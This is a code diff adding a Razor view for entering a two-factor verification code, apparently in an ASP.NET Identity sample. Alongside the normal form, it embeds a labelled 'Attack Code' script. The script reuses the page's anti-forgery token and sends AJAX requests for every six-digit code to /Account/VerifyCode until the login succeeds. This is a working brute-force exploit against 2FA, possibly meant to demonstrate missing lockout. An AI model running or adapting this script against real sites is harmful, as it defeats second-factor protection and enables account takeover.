@@ -1,0 +1,81 @@
+@model IdentitySample.Models.VerifyCodeViewModel
+@{
+    ViewBag.Title = "Enter Verification Code";
+}
+
+<h2>@ViewBag.Title.</h2>
+
+@using (Html.BeginForm("VerifyCode", "Account", new { ReturnUrl = Model.ReturnUrl }, FormMethod.Post, new { @class = "form-horizontal", role = "form" })) {
+    @Html.AntiForgeryToken()
+    @Html.ValidationSummary("", new { @class = "text-danger" })
+    @Html.Hidden("provider", @Model.Provider)
+    <h4>@ViewBag.Status</h4>
+    <hr />
+    <div class="form-group">
+        @Html.LabelFor(m => m.Code, new { @class = "col-md-2 control-label" })
+        <div class="col-md-10">
+            @Html.TextBoxFor(m => m.Code, new { @class = "form-control" })
+        </div>
+    </div>
+    <div class="form-group">
+        <div class="col-md-offset-2 col-md-10">
+            <div class="checkbox">
+                @Html.CheckBoxFor(m => m.RememberBrowser)
+                @Html.LabelFor(m => m.RememberBrowser)
+            </div>
+        </div>
+    </div>
+    <div class="form-group">
+        <div class="col-md-offset-2 col-md-10">
+            <input type="submit" class="btn btn-default" value="Submit" />
+        </div>
+    </div>
+}
+
+
+<div class="row">
+    <div class="col-md-4">
+        <h2>Attack Code</h2>
+        <p>
+            This will attempt to brute force the 2fa code.
+        </p>
+        <p><button id="codeButton" class="btn btn-default">Go</button></p>
+    </div>
+</div>
+
+@section Scripts {
+    @Scripts.Render("~/bundles/jqueryval")
+<script>
+    $(function () {
+        $("#codeButton").click(function () {
+            var token = $("input[name=__RequestVerificationToken]").val();
+            var provider = $("#provider").val();
+            var code = 0;
+            for (var i = 100000; i < 1000000; i++) {
+                (function (i) {
+                    var data = {
+                        "__RequestVerificationToken": token,
+                        Code: i,
+                        provider: provider,
+                        RememberBrowser:"false"
+                    };
+                    if (i % 10000 == 0) {
+                        console.log("trying", i);
+                    }
+                    $.ajax({
+                        url: "/Account/VerifyCode",
+                        type: "POST",
+                        data: data,
+                        success: function (data, status, xhr) {
+                            var idx = data.indexOf("Enter Verification Code")
+                            if (idx < 0) {
+                                window.location = "/";
+                            }
+                        }
+                    });
+                })(i);
+            }
+        });
+    });
+</script>
+}
